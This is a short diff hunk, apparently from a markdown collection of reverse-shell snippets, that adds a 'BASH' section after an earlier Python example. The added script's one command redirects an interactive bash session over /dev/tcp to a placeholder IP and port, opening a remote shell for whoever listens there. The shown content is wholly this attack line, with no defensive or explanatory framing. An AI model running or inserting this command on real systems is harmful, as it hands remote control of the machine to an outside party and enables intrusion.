@@ -29,3 +29,9 @@ if __name__ == "__main__":
 
 ```
 
+# BASH
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/<IP>/<port> 0>&1
+```
